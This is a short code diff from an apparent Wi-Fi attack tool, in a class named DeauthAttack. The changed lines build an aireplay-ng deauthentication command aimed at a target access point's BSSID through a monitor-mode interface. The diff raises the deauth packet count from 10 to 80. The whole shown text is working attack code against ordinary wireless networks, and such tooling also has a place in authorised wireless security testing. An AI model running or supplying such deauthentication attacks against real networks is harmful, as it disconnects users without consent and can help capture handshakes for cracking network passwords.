@@ -30,7 +30,7 @@ class DeauthAttack(AbstractAttack):
         sb.run(cmd)
 
         cmd = ['aireplay-ng',
-               '-0','10',
+               '-0','80',
                '-a', kwargs['target'].bssid,
                kwargs['interface'].monitor]
 
